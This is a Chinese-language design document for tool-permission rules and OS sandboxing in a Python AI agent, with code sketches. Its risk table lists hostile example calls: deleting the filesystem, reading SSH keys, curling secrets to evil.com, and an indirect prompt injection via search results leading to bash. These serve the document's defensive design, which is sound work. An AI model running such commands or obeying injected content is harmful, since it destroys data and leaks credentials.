# 工具权限 + 安全沙箱 — 架构设计 & 代码实现

> 对齐参考:[Claude Code 工具权限设计](../tool/permission-design.md)、[Claude Code 沙箱实现](../tool/sandbox-implementation.md)
> 适用版本:`feature/fork-compact` 分支(2026-06-28),基于 M11.7 SM 对齐后的代码状态
> 目标:**用最小的代码改动,把"应用层规则 + OS 层沙箱"两层防御建起来** —— 当前项目只有 2 个内置工具(calc/search),但架构要从一开始就为后续 `read_file/write_file/bash` 等危险工具预留好安全防线

---

## 0. 目录

1. [现状盘点与缺口](#1-现状盘点与缺口)
2. [设计哲学](#2-设计哲学)
3. [架构分层](#3-架构分层)
4. [应用层 — 工具权限 (Tool Permission)](#4-应用层--工具权限-tool-permission)
5. [OS 层 — 安全沙箱 (Security Sandbox)](#5-os-层--安全沙箱-security-sandbox)
6. [关键交互点 — 两层协同](#6-关键交互点--两层协同)
7. [代码实现路径](#7-代码实现路径)
8. [与 Claude Code 的对齐对照表](#8-与-claude-code-的对齐对照表)
9. [实施顺序 + 工作量估算](#9-实施顺序--工作量估算)

---

## 1. 现状盘点与缺口

### 1.1 当前 `agent_core/tools/` 实现盘点

```
agent_core/tools/
├── __init__.py        (空文件)
├── base.py            (142 行) — ToolDef dataclass + ToolRegistry
└── builtin.py         (149 行) — calc (AST 白名单) + search (DuckDuckGo)
```

| 组件 | 实现 | 缺失 |
|------|------|------|
| `ToolDef` (dataclass) | ✅ name/description/parameters/handler | ❌ 无 category/version/deprecated 字段 |
| `ToolRegistry.execute` | ✅ 超时(10s)+ 重试(3 次指数退避)+ ValueError 短路 | ❌ 无 schema 校验 / 无 hook / 无 policy |
| `list_schemas` (anthropic/openai) | ✅ 双 provider 适配 | — |
| `register_builtin_tools` | ✅ calc + search | ❌ 无 `read_file/write_file/bash/git_status` 等危险工具 |
| **应用层权限 (Permission)** | ❌ 不存在 | ❌❌❌ 完全缺失 |
| **OS 层沙箱 (Sandbox)** | ❌ 不存在 | ❌❌❌ 完全缺失 |
| **审计 (audit log)** | ⚠️ `_pending_tool_logs` 记到 session.jsonl(临时) | ❌ 无独立 audit 通道 |
| **分类器 (Haiku YOLO)** | ❌ 不存在 | ❌(可选) |

### 1.2 关键风险点(假设现在直接加 `bash` 工具会怎样)

| 场景 | 现在的行为 | 风险等级 |
|------|-----------|---------|
| LLM 调 `bash("rm -rf /")` | ToolRegistry.execute 直接跑 | 🔴 灾难 |
| LLM 调 `bash("cat ~/.ssh/id_rsa")` | 直接读 | 🔴 数据泄露 |
| LLM 调 `bash("curl evil.com?data=$AWS_SECRET")` | 直接发 | 🔴 数据外泄 |
| LLM 调 `search("prompt injection payload")` 拿到恶意网页内容后,**再**调 `bash` | 两步组合攻击 | 🔴 间接命令注入 |
| LLM 调 `calc("__import__('os').system('rm')")` | **安全**(AST 白名单) | 🟢 已防护 |

→ **当前最缺的就是工具权限 + 沙箱** —— 后面如果补 `bash/read_file/write_file`,这两层是**必建**,不是可选。

---

## 2. 设计哲学

### 2.1 两层防御 (Defense-in-Depth)

对齐 Claude Code 的核心思想:**Permission 是"编辑时规则"(应用层),Sandbox 是"运行时保险"(OS 层)**。两层都失败的概率极低,且各有不可替代的职责。

```
┌─────────────────────────────────────────────────────────┐
│                    应用层 Permission                       │
│  - 规则匹配 (allow/deny/ask)                              │
│  - 用户弹窗 (UI)                                          │
│  - 审计日志 (audit)                                        │
│  - 钩子链 (before/after hook)                              │
│  - 优先级:policySettings > flagSettings > userSettings    │
│                                                          │
│  优势:可读规则、易于用户理解、可针对单条命令精细控制          │
│  劣势:被绕过 = 一行代码 bug = 全部失守                      │
└─────────────────────────────────────────────────────────┘
                            + (互为兜底)
┌─────────────────────────────────────────────────────────┐
│                    OS 层 Sandbox                          │
│  - macOS: Seatbelt / Linux: bubblewrap (bwrap)           │
│  - FS allow/deny 路径白名单                                │
│  - Network allowedDomains/deniedDomains                   │
│  - 进程级强制隔离 (无法被 Python 代码绕过)                   │
│                                                          │
│  优势:即使应用层被绕过,OS 层兜底                           │
│  劣势:不能精细到"这条命令是否危险",只能给路径/域名白名单      │
└─────────────────────────────────────────────────────────┘
```

### 2.2 与现有系统的边界

```
用户 ──> LLM ──> tool_use
                 │
                 ▼
            ┌────────────────────────────────────────┐
            │  ToolPermissionGate (新)              │ ← 应用层
            │  - check_permissions(tool_name, args) │
            │  - 返回 allow / ask / deny            │
            └────────────────────────────────────────┘
                 │ allow
                 ▼
            ┌────────────────────────────────────────┐
            │  ToolRegistry.execute (现有)           │
            │  - 超时 / 重试 / schema 校验 (新增)   │
            └────────────────────────────────────────┘
                 │
                 ▼
            ┌────────────────────────────────────────┐
            │  SandboxManager.wrap (新,可选)         │ ← OS 层
            │  - bash/file 工具 → wrapWithSandbox   │
            │  - calc/search 工具 → 不需要           │
            └────────────────────────────────────────┘
                 │
                 ▼
              OS Kernel
```

**关键边界**:
- **Permission** 管"要不要让 LLM 调这条工具"——是**对 LLM 的策略**
- **Sandbox** 管"如果真跑了,能访问哪些资源"——是**对 OS 的兜底**
- **ToolRegistry.execute** 只管"怎么跑、超时多少、重试几次"——是**执行机制**

### 2.3 与 Claude Code 的对齐 vs 偏离

| 维度 | Claude Code | 本项目目标 | 对齐/偏离 |
|------|------------|-------------|----------|
| 应用层 | 11000 行 TypeScript | 600-800 行 Python | **大幅简化** —— 不需要 classifier、不需要 50+ 种 permission mode |
| OS 层 | Seatbelt/bwrap runtime | 复用同款 runtime(npm 包) | **完全对齐** —— 通过 Python subprocess 调 |
| 危险工具数 | 30+ | 起步 3-5 个(read/write/bash) | **从最小集做起** |
| 规则来源 | 8 个 (command/session/local/project/user/cliArg/policy/flag) | 4 个 (local/project/policy/env) | **简化** —— 没有 enterprise `policySettings`,先不做 GrowthBook 远程配置 |
| UI 弹窗 | 复杂 TUI + React | Streamlit sidebar + 弹窗 | **对齐语义,简化实现** |
| Classifier (Haiku YOLO) | 有 | ❌ 不做 | **不做** —— 项目规模不需要,可后续补 |
| Plan mode / AcceptEdits mode | 有 | ⚠️ 后续考虑 | **不做 M1**,M2+ 再加 |

---

## 3. 架构分层

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: UI / Streamlit                                     │
│   web/components/PermissionDialog.py                        │
│   web/app.py sidebar — 显示规则 + 弹窗                       │
└─────────────────────────────────────────────────────────────┘
                            ↕
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Config / Settings                                  │
│   agent_core/tools/permission_config.py                    │
│   - PermissionRule (allow/deny/ask)                        │
│   - PermissionMode (default/acceptEdits/bypass/plan)       │
│   - 多源合并:policySettings > env > projectSettings >       │
│              localSettings (4 源,简化自 CC 的 8 源)         │
└─────────────────────────────────────────────────────────────┘
                            ↕
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: 决策引擎 (Decision Engine)                          │
│   agent_core/tools/permission_engine.py                    │
│   - check_permissions(tool_name, input) → Decision         │
│   - 流水线:hook → deny rule → ask rule → tool.self_check →  │
│             mode → allow rule → ask fallback               │
└─────────────────────────────────────────────────────────────┘
                            ↕
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: 执行机制 (Execution)                               │
│   agent_core/tools/base.py (ToolRegistry.execute) — 现有   │
│   + before/after_tool_call hook (新增)                      │
│   + JSON Schema 校验 (新增)                                 │
└─────────────────────────────────────────────────────────────┘
                            ↕
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: OS 层沙箱 (Sandbox Adapter)                        │
│   agent_core/tools/sandbox_manager.py                      │
│   - is_sandbox_enabled() / initialize() / wrap()           │
│   - 复用 @anthropic-ai/sandbox-runtime (mac seatbelt +     │
│     linux bwrap,同 Claude Code)                             │
└─────────────────────────────────────────────────────────────┘
                            ↕
┌─────────────────────────────────────────────────────────────┐
│ Layer 0: Tool 自定义权限钩子                                 │
│   每个 ToolDef 自己实现 check_permissions(input)             │
│   - BashTool: AST 静态分析 + 子命令拆分 + 路径约束           │
│   - ReadTool: 路径白名单                                    │
│   - WriteTool: 路径白名单 + 内容 secret scan                │
│   - CalcTool: 不需要(已 AST 沙箱)                          │
│   - SearchTool: domain 白名单                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 4. 应用层 — 工具权限 (Tool Permission)

### 4.1 类型系统 (`agent_core/tools/permission_types.py`)

完全对齐 Claude Code 的类型,简化为 Python + Pydantic:

```python
# agent_core/tools/permission_types.py
"""
对齐 Claude Code src/types/permissions.ts 的 Python 实现
简化:去掉 policySettings/GrowthBook/feature flag
"""
from __future__ import annotations
from enum import Enum
from typing import Literal, Optional, Union
from pydantic import BaseModel, Field


# ── 行为 ──────────────────────────────────────────────
class PermissionBehavior(str, Enum):
    ALLOW = "allow"
    DENY = "deny"
    ASK = "ask"
    PASSTHROUGH = "passthrough"  # 当前层不决定,让上层处理


# ── 规则来源(简化自 CC 的 8 源 → 4 源) ─────────────────
class PermissionRuleSource(str, Enum):
    POLICY = "policySettings"   # 高优,企业/管理员(只读)
    FLAG = "flagSettings"       # 启动参数(只读)
    PROJECT = "projectSettings" # .agent_data/settings.json(项目级)
    LOCAL = "localSettings"     # ~/.agent_data/settings.json(用户级)


# ── 规则值 ─────────────────────────────────────────────
class PermissionRuleValue(BaseModel):
    tool_name: str                                  # "Bash" / "Read" / "Write" / ...
    rule_content: Optional[str] = None              # "rm:*" / "/path/**" / None(整个 tool)


class PermissionRule(BaseModel):
    source: PermissionRuleSource
    behavior: PermissionBehavior
    rule_value: PermissionRuleValue


# ── 模式 ───────────────────────────────────────────────
class PermissionMode(str, Enum):
    DEFAULT = "default"               # 规则优先,无匹配则 ask
    ACCEPT_EDITS = "acceptEdits"      # 文件编辑类工具自动放行
    BYPASS = "bypassPermissions"      # 跳过所有 ask(deny/safetyCheck 仍生效)
    DONT_ASK = "dontAsk"              # ask → 自动 deny
    PLAN = "plan"                     # plan mode,只读工具放行


# ── 决策结果 ──────────────────────────────────────────
class PermissionDecisionReason(BaseModel):
    """为什么?8 个变体(对齐 CC)"""
    type: Literal["rule", "mode", "hook", "subcommandResults",
                  "classifier", "workingDir", "safetyCheck", "other"]
    # 不同 type 对应不同字段(用 discriminated union 更精确)
    rule: Optional[PermissionRule] = None
    mode: Optional[PermissionMode] = None
    hook_name: Optional[str] = None
    reason: Optional[str] = None


class PermissionDecision(BaseModel):
    behavior: PermissionBehavior
    decision_reason: PermissionDecisionReason
    updated_input: Optional[dict] = None  # hook 可改写 input


# ── 工具权限上下文(对齐 CC ToolPermissionContext) ──────
class ToolPermissionContext(BaseModel):
    mode: PermissionMode = PermissionMode.DEFAULT
    always_allow_rules: dict[PermissionRuleSource, list[str]] = Field(default_factory=dict)
    always_deny_rules: dict[PermissionRuleSource, list[str]] = Field(default_factory=dict)
    always_ask_rules: dict[PermissionRuleSource, list[str]] = Field(default_factory=dict)
    additional_working_directories: list[str] = Field(default_factory=list)
    should_avoid_permission_prompts: bool = False  # 后台 agent 用
```

### 4.2 规则匹配 (`permission_matcher.py`)

对齐 CC 的 `shellRuleMatching.ts`,**简化:不做 compound rule**(M1 阶段不需要):

```python
# agent_core/tools/permission_matcher.py
"""
规则匹配器 — 把规则字符串解析成可匹配的形态
"""
import re
from dataclasses import dataclass
from typing import Union


@dataclass
class ExactMatch:
    command: str  # "npm install"

@dataclass
class PrefixMatch:
    prefix: str   # "npm run:"

@dataclass
class WildcardMatch:
    pattern: str  # "*echo*"

@dataclass
class PathGlobMatch:
    pattern: str  # "/tmp/**"

ShellPermissionRule = Union[ExactMatch, PrefixMatch, WildcardMatch, PathGlobMatch]


def parse_rule(tool_name: str, rule_content: str | None) -> ShellPermissionRule:
    """
    解析 "Bash(npm run:*)" 这种规则
    - 无 ruleContent → 整个 tool 命中(返回 None)
    - "*" → wildcard
    - ":*" → prefix
    - 含 "/" → path glob
    - 否则 → exact
    """
    if rule_content is None:
        return None  # 整个 tool 命中
    if rule_content == "*":
        return WildcardMatch(pattern="*")
    if rule_content.endswith(":*"):
        return PrefixMatch(prefix=rule_content[:-2])
    if "/" in rule_content:
        return PathGlobMatch(pattern=rule_content)
    return ExactMatch(command=rule_content)


def match_rule(rule: ShellPermissionRule, tool_input: dict) -> bool:
    """
    工具实际调用时,判断规则是否匹配
    - BashTool: input["command"]
    - ReadTool: input["path"]
    - WriteTool: input["path"]
    """
    if rule is None:
        return True  # 整个 tool 命中
    if isinstance(rule, ExactMatch):
        return tool_input.get("command") == rule.command
    if isinstance(rule, PrefixMatch):
        return tool_input.get("command", "").startswith(rule.prefix + " ")
    if isinstance(rule, WildcardMatch):
        # fnmatch 比 CC 的 glob 简单,但够用
        import fnmatch
        return fnmatch.fnmatch(tool_input.get("command", ""), rule.pattern)
    if isinstance(rule, PathGlobMatch):
        import fnmatch
        return fnmatch.fnmatch(tool_input.get("path", ""), rule.pattern)
    return False
```

### 4.3 决策引擎 (`permission_engine.py`)

**对齐 CC `permissions.ts` 的 hasPermissionsToUseTool** —— 但简化为 7 步(去掉 classifier / subcommand AST),并保留所有关键拦截点:

```python
# agent_core/tools/permission_engine.py
"""
应用层权限决策引擎
对齐 Claude Code permissions.ts:473 hasPermissionsToUseTool
简化:去掉 classifier (M1 阶段),保留 hook + mode + safetyCheck
"""
from __future__ import annotations
import logging
from typing import Optional, Callable

from .permission_types import (
    PermissionBehavior, PermissionDecision, PermissionDecisionReason,
    PermissionMode, ToolPermissionContext, PermissionRuleSource,
)
from .permission_matcher import parse_rule, match_rule
from .base import ToolDef

logger = logging.getLogger(__name__)


class PermissionEngine:
    """对每条 tool_use 做应用层 allow/deny/ask 决策"""

    def __init__(self, context: ToolPermissionContext):
        self.context = context

    def check_permissions(
        self,
        tool: ToolDef,
        tool_input: dict,
    ) -> PermissionDecision:
        """
        7 步流水线(对齐 CC permissions.ts:473 顺序):

        1a. 整个 tool 命中 deny rule?          → deny
        1b. 整个 tool 命中 ask rule?           → ask (BashTool 例外:让 BashTool 自己处理子命令)
        1c. 调 tool.check_permissions(input)  → deny/ask/passthrough
        1d. tool 返 deny?                      → deny
        1e. tool.requires_user_interaction && ask? → ask
        1f. tool 返 ask 且 reason 是 rule.ask? → ask (bypass 模式无法跳过)
        1g. tool 返 ask 且 reason 是 safetyCheck? → ask (.agent_data/ 等敏感路径)
        2a. mode == bypass?                    → allow
        2b. 整个 tool 命中 allow rule?         → allow
        3.  passthrough                         → ask
        """
        ctx = self.context
        tool_name = tool.name

        # 1a. 全局 deny rule
        deny_rule = self._match_first(tool_name, tool_input, ctx.always_deny_rules)
        if deny_rule:
            return PermissionDecision(
                behavior=PermissionBehavior.DENY,
                decision_reason=PermissionDecisionReason(
                    type="rule", rule=deny_rule, reason=f"命中 deny rule: {tool_name}"
                ),
            )

        # 1b. 全局 ask rule
        ask_rule = self._match_first(tool_name, tool_input, ctx.always_ask_rules)
        if ask_rule and tool_name != "Bash":
            return PermissionDecision(
                behavior=PermissionBehavior.ASK,
                decision_reason=PermissionDecisionReason(
                    type="rule", rule=ask_rule, reason=f"命中 ask rule: {tool_name}"
                ),
            )

        # 1c. tool 自定义权限检查
        if hasattr(tool, "check_permissions"):
            tool_decision = tool.check_permissions(tool_input, ctx)
            # 1d-1g
            if tool_decision.behavior == PermissionBehavior.DENY:
                return tool_decision
            if tool_decision.behavior == PermissionBehavior.ASK:
                # safetyCheck + content-ask 在 bypass 模式仍生效
                reason_type = tool_decision.decision_reason.type
                if reason_type in ("safetyCheck", "rule"):
                    return tool_decision
                # mode == bypass → 跳过普通 ask
                if ctx.mode == PermissionMode.BYPASS:
                    pass
                else:
                    return tool_decision

        # 2a. bypass mode
        if ctx.mode == PermissionMode.BYPASS:
            return PermissionDecision(
                behavior=PermissionBehavior.ALLOW,
                decision_reason=PermissionDecisionReason(
                    type="mode", mode=ctx.mode, reason="bypassPermissions mode"
                ),
            )

        # 2b. allow rule
        allow_rule = self._match_first(tool_name, tool_input, ctx.always_allow_rules)
        if allow_rule:
            return PermissionDecision(
                behavior=PermissionBehavior.ALLOW,
                decision_reason=PermissionDecisionReason(
                    type="rule", rule=allow_rule, reason=f"命中 allow rule: {tool_name}"
                ),
            )

        # 3. 默认 ask
        return PermissionDecision(
            behavior=PermissionBehavior.ASK,
            decision_reason=PermissionDecisionReason(
                type="other", reason=f"无匹配规则,默认 ask: {tool_name}({tool_input})"
            ),
        )

    def _match_first(
        self, tool_name: str, tool_input: dict,
        rules_by_source: dict[PermissionRuleSource, list[str]],
    ) -> Optional[dict]:
        """按 source 优先级遍历,返回第一条命中的规则"""
        for source in [
            PermissionRuleSource.POLICY,
            PermissionRuleSource.FLAG,
            PermissionRuleSource.PROJECT,
            PermissionRuleSource.LOCAL,
        ]:
            for rule_str in rules_by_source.get(source, []):
                # 解析 "Bash(rm:*)" → (tool_name="Bash", content="rm:*")
                parsed_tool, content = self._parse_rule_string(rule_str)
                if parsed_tool != tool_name:
                    continue
                rule = parse_rule(tool_name, content)
                if match_rule(rule, tool_input):
                    return {"source": source, "rule_str": rule_str}
        return None

    @staticmethod
    def _parse_rule_string(rule_str: str) -> tuple[str, Optional[str]]:
        """Bash(rm:*) → ('Bash', 'rm:*')  /  Bash → ('Bash', None)"""
        if "(" in rule_str:
            name, rest = rule_str.split("(", 1)
            content = rest.rstrip(")")
            return name, content
        return rule_str, None
```

### 4.4 Hook 机制 (`permission_hook.py`)

对齐 CC `utils/hooks.ts` 的 PreToolUse / PermissionRequest:

```python
# agent_core/tools/permission_hook.py
"""
Hook 机制 — 在 tool 执行前/后插入用户自定义逻辑

对齐 Claude Code:
- PreToolUse Hook: tool 执行前(可改写 input 或 deny)
- PostToolUse Hook: tool 执行后(可改写 output)
- PermissionRequest Hook: 后台 agent 弹窗时给外部决策机会

实现:同步回调链(项目规模不需要异步并行,简化)
"""
from typing import Callable, Optional
from dataclasses import dataclass


@dataclass
class PreToolUseResult:
    decision: Optional[PermissionBehavior] = None  # None = 让上层决定
    updated_input: Optional[dict] = None
    additional_context: Optional[str] = None


PreToolUseHook = Callable[[str, dict], PreToolUseResult]


class HookRegistry:
    """注册 + 串行执行 hook"""

    def __init__(self):
        self._pre_tool_use_hooks: list[tuple[str, PreToolUseHook]] = []
        # name → hook, 名字用于 debug 和 unregister

    def register_pre_tool_use(self, name: str, hook: PreToolUseHook):
        self._pre_tool_use_hooks.append((name, hook))

    def run_pre_tool_use(self, tool_name: str, tool_input: dict) -> PreToolUseResult:
        """串行跑所有 hook,任一 deny 立即返回"""
        merged_input = tool_input
        for hook_name, hook in self._pre_tool_use_hooks:
            try:
                result = hook(tool_name, merged_input)
            except Exception as e:
                logger.exception(f"PreToolUse hook {hook_name} raised: {e}")
                continue
            # hook 可改 input(后一个 hook 看到前一个的结果)
            if result.updated_input is not None:
                merged_input = result.updated_input
            # hook 可直接 deny
            if result.decision == PermissionBehavior.DENY:
                return result
        return PreToolUseResult(updated_input=merged_input)


# ── 预置 hook(开箱即用) ────────────────────────────────

def make_secret_scan_hook() -> PreToolUseHook:
    """检测 Write/Bash input 是否含敏感信息(AWS key / SSH key / API token)"""
    from agent_core.memory.secret_scanner import scan_for_secrets

    def hook(tool_name: str, tool_input: dict) -> PreToolUseResult:
        if tool_name not in ("Write", "Edit", "Bash"):
            return PreToolUseResult()
        content = tool_input.get("content") or tool_input.get("command") or ""
        hits = scan_for_secrets(content)
        if hits:
            return PreToolUseResult(
                decision=PermissionBehavior.ASK,
                additional_context=f"⚠️ 检测到 {len(hits)} 处敏感信息,需用户确认",
            )
        return PreToolUseResult()

    return hook


def make_path_safety_hook(allowed_roots: list[str]) -> PreToolUseHook:
    """限制 Read/Write/Bash 的操作路径必须在 allowed_roots 内"""
    from agent_core.memory.path_validator import MemoryPathValidator

    validators = [MemoryPathValidator(root=Path(r)) for r in allowed_roots]

    def hook(tool_name: str, tool_input: dict) -> PreToolUseResult:
        path = tool_input.get("path") or tool_input.get("command") or ""
        # 简化:从 command 中 extract path(tokenize 太重,先用 regex)
        paths = _extract_paths_from_command(path) if tool_name == "Bash" else [path]
        for p in paths:
            if not any(v.is_within(p) for v in validators):
                return PreToolUseResult(
                    decision=PermissionBehavior.DENY,
                    additional_context=f"路径 {p} 不在白名单内",
                )
        return PreToolUseResult()

    return hook
```

### 4.5 Bash 工具权限(`bash_permissions.py`)

**对齐 CC `bashPermissions.ts`** —— 这是最复杂的子模块。M1 简化版:不做 tree-sitter AST(用 `shlex.split` + 简单 regex);M2+ 再补 AST。

```python
# agent_core/tools/bash_permissions.py
"""
BashTool.check_permissions(input, context) 的实现
对齐 Claude Code src/tools/BashTool/bashPermissions.ts:1663 bashToolHasPermission

M1 简化:
- 不做 tree-sitter AST,改用 shlex.split + regex 子命令拆分
- 不做 classifier
- 不做 speculative check
"""
from __future__ import annotations
import shlex
import re
from typing import Optional

from .permission_types import (
    PermissionBehavior, PermissionDecision, PermissionDecisionReason,
    ToolPermissionContext,
)
from .permission_matcher import parse_rule, match_rule


# 安全 wrapper 前缀(对齐 CC stripSafeWrappers)
SAFE_WRAPPERS = ["timeout", "time", "nice", "env", "command", "nohup"]


def _split_command(command: str) -> list[str]:
    """
    把 "cd /tmp && ls -la && echo done" 拆成 ['cd /tmp', 'ls -la', 'echo done']
    M1 简化:支持 && ; | 但不处理嵌套引号/命令替换(够用 80% 场景)
    """
    # 先按顶层 && ; | 拆(M1 不处理引号内的 &&,这是简化点)
    parts = re.split(r"\s*(?:&&|;|\|)\s*", command)
    return [p.strip() for p in parts if p.strip()]


def _strip_safe_wrappers(cmd: str) -> str:
    """
    timeout 30 FOO=bar bazel run → bazel run
    对齐 CC bashPermissions.ts:stripSafeWrappers
    """
    parts = cmd.split()
    while parts and parts[0] in SAFE_WRAPPERS:
        parts = parts[1:]
    # 剥 FOO=bar 前缀
    while parts and re.match(r"^[A-Z_][A-Z0-9_]*=", parts[0]):
        parts = parts[1:]
    return " ".join(parts) if parts else cmd


def _is_cd_command(cmd: str) -> bool:
    return cmd.startswith("cd ") or cmd == "cd"


def bash_check_permissions(
    tool_input: dict,
    context: ToolPermissionContext,
) -> PermissionDecision:
    """
    对齐 CC bashToolHasPermission 流水线(简化版)
    """
    command = tool_input.get("command", "")
    if not command:
        return PermissionDecision(
            behavior=PermissionBehavior.ASK,
            decision_reason=PermissionDecisionReason(type="other", reason="empty command"),
        )

    # ── 1. 拆分 subcommand ──
    subcommands = _split_command(command)
    MAX_SUBCOMMANDS = 50  # 对齐 CC MAX_SUBCOMMANDS_FOR_SECURITY_CHECK
    if len(subcommands) > MAX_SUBCOMMANDS:
        return PermissionDecision(
            behavior=PermissionBehavior.ASK,
            decision_reason=PermissionDecisionReason(
                type="other", reason=f"subcommand 数 {len(subcommands)} 超过 {MAX_SUBCOMMANDS}"
            ),
        )

    # ── 2. cd + 危险命令检测(对齐 CC bare-git 防御的简化版) ──
    has_cd = any(_is_cd_command(sc) for sc in subcommands)
    has_git = any("git" in sc.split() for sc in subcommands if sc.split())
    if has_cd and has_git:
        return PermissionDecision(
            behavior=PermissionBehavior.ASK,
            decision_reason=PermissionDecisionReason(
                type="safetyCheck",
                reason="cd + git 组合可能加载恶意 .git/config",
            ),
        )

    # ── 3. 对每个 subcommand 跑规则匹配 ──
    sub_results = []
    for sc in subcommands:
        sc_stripped = _strip_safe_wrappers(sc)
        result = _check_single_command(sc_stripped, tool_input, context)
        sub_results.append((sc, result))
        if result.behavior in (PermissionBehavior.DENY, PermissionBehavior.ASK):
            # 任一子命令 deny/ask → 立即返回
            return PermissionDecision(
                behavior=result.behavior,
                decision_reason=PermissionDecisionReason(
                    type="subcommandResults",
                    reason=f"子命令 `{sc}` 命中规则",
                ),
                updated_input=tool_input,
            )

    # ── 4. 全部 allow ──
    return PermissionDecision(
        behavior=PermissionBehavior.ALLOW,
        decision_reason=PermissionDecisionReason(type="other", reason="所有 subcommand 通过"),
    )


def _check_single_command(
    cmd: str, tool_input: dict, context: ToolPermissionContext,
) -> PermissionDecision:
    """单条命令的规则匹配(对齐 CC bashToolCheckPermission)"""
    # exact match → deny / ask / allow
    # prefix match → deny / ask / allow
    for source in [PermissionRuleSource.POLICY, PermissionRuleSource.FLAG,
                   PermissionRuleSource.PROJECT, PermissionRuleSource.LOCAL]:
        for rule_str in context.always_deny_rules.get(source, []):
            if _rule_matches(rule_str, cmd, tool_input):
                return PermissionDecision(
                    behavior=PermissionBehavior.DENY,
                    decision_reason=PermissionDecisionReason(type="rule", reason=rule_str),
                )
    for source in [...]:
        for rule_str in context.always_ask_rules.get(source, []):
            if _rule_matches(rule_str, cmd, tool_input):
                return PermissionDecision(...ASK...)
    # ... 类似 allow

    # acceptEdits 模式 + 只读命令 → allow
    if context.mode == PermissionMode.ACCEPT_EDITS and _is_read_only(cmd):
        return PermissionDecision(behavior=PermissionBehavior.ALLOW, ...)

    # 默认 passthrough(让上层决定)
    return PermissionDecision(behavior=PermissionBehavior.PASSTHROUGH, ...)


def _rule_matches(rule_str: str, cmd: str, tool_input: dict) -> bool:
    parsed_tool, content = _parse_rule_string(rule_str)
    if parsed_tool != "Bash":
        return False
    rule = parse_rule(parsed_tool, content)
    return match_rule(rule, {"command": cmd} | tool_input)
```

### 4.6 规则持久化 (`permission_loader.py`)

**对齐 CC `permissionsLoader.ts`** —— 从 settings.json 加载,支持 4 个来源合并:

```python
# agent_core/tools/permission_loader.py
"""
从 ~/.agent_data/settings.json + .agent_data/settings.json 加载权限规则
"""
import json
from pathlib import Path
from typing import Optional

from .permission_types import (
    PermissionMode, PermissionRuleSource, ToolPermissionContext,
)


SETTINGS_PATHS = {
    PermissionRuleSource.LOCAL: Path.home() / ".agent_data" / "settings.json",
    PermissionRuleSource.PROJECT: Path.cwd() / ".agent_data" / "settings.json",
}


def load_tool_permission_context() -> ToolPermissionContext:
    """
    从 4 个 source 合并规则,返回 ToolPermissionContext

    settings.json 格式:
    {
      "permissions": {
        "allow": ["Read(./docs/**)", "Bash(npm:*)"],
        "deny":  ["Bash(rm:*)", "Bash(sudo:*)"],
        "ask":   ["Bash(git push:*)"],
        "additionalDirectories": ["../shared-lib"]
      },
      "permissionMode": "default"
    }
    """
    context = ToolPermissionContext()

    # 按优先级合并(高优先级覆盖低)
    for source in [PermissionRuleSource.LOCAL, PermissionRuleSource.PROJECT]:
        path = SETTINGS_PATHS.get(source)
        if not path or not path.exists():
            continue
        try:
            settings = json.loads(path.read_text())
        except Exception as e:
            logger.warning(f"加载 {path} 失败: {e}")
            continue

        perms = settings.get("permissions", {})
        context.always_allow_rules[source] = perms.get("allow", [])
        context.always_deny_rules[source] = perms.get("deny", [])
        context.always_ask_rules[source] = perms.get("ask", [])
        # additionalDirectories ...

        # mode (高优覆盖低优)
        mode_str = settings.get("permissionMode")
        if mode_str:
            try:
                context.mode = PermissionMode(mode_str)
            except ValueError:
                pass

    return context
```

### 4.7 安全检查(safety check)

对齐 CC `safetyCheck` —— 硬编码敏感路径(`.agent_data/` settings / `.git/`)和 shell 配置:

```python
# agent_core/tools/safety_check.py
"""
安全检查 — .agent_data/ .git/ .ssh/ 等敏感路径
对齐 CC permissions.ts:1g safetyCheck
"""
from pathlib import Path


# 绝对禁止 read/write 的路径(LLM 自己改自己的 settings = 越权)
SENSITIVE_PATHS = [
    Path.home() / ".agent_data" / "settings.json",
    Path.cwd() / ".agent_data" / "settings.json",
    Path.home() / ".ssh",
    Path.home() / ".bashrc",
    Path.home() / ".zshrc",
    Path.home() / ".bash_profile",
]

# 项目级敏感
PROJECT_SENSITIVE = [
    Path.cwd() / ".agent_data" / "settings.json",
    Path.cwd() / ".git" / "config",
]


def is_sensitive_path(path: str) -> bool:
    """路径是否在敏感路径列表中?"""
    p = Path(path).resolve()
    for sensitive in SENSITIVE_PATHS + PROJECT_SENSITIVE:
        try:
            p.relative_to(sensitive.resolve())
            return True
        except ValueError:
            continue
    return False


def safety_check(tool_name: str, tool_input: dict) -> bool:
    """
    返回 True 表示需要拦截(进 ask 流程)
    """
    if tool_name in ("Read", "Write", "Edit"):
        return is_sensitive_path(tool_input.get("path", ""))
    return False
```

---

## 5. OS 层 — 安全沙箱 (Security Sandbox)

### 5.1 架构决策

**复用 `@anthropic-ai/sandbox-runtime`**(Claude Code 同款 npm 包),通过 Python subprocess 调用。这是**最稳的方案**:

- ✅ 与 Claude Code 完全对齐(用户预期一致)
- ✅ macOS Seatbelt / Linux bubblewrap 都是成熟方案
- ❌ 需要 Node.js ≥ 18(项目已有 LLM 调 Node.js 客户端,OK)

### 5.2 适配层(`sandbox_manager.py`)

**对齐 CC `src/utils/sandbox/sandbox-adapter.ts`** —— 配置翻译 + 生命周期管理:

```python
# agent_core/tools/sandbox_manager.py
"""
OS 层沙箱管理器
对齐 Claude Code src/utils/sandbox/sandbox-adapter.ts

设计:
- is_sandbox_enabled() / initialize() / wrap_with_sandbox() / cleanup()
- 配置来源:settings.json 的 sandbox 段
- 复用 @anthropic-ai/sandbox-runtime (通过 subprocess)
"""
from __future__ import annotations
import asyncio
import json
import logging
import shutil
import subprocess
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


class SandboxConfig:
    """对齐 CC SandboxSettingsSchema"""
    enabled: bool = False
    fail_if_unavailable: bool = False
    auto_allow_bash_if_sandboxed: bool = True
    allow_unsandboxed_commands: bool = True
    network_allowed_domains: list[str] = []
    network_denied_domains: list[str] = []
    fs_allow_write: list[str] = []
    fs_deny_write: list[str] = []
    fs_allow_read: list[str] = []
    fs_deny_read: list[str] = []
    excluded_commands: list[str] = []


class SandboxManager:
    """单例(对齐 CC)"""

    _instance: Optional["SandboxManager"] = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
            cls._instance._config = SandboxConfig()
        return cls._instance

    def is_sandbox_enabled(self) -> bool:
        """对齐 CC isSandboxingEnabled — 4 段短路"""
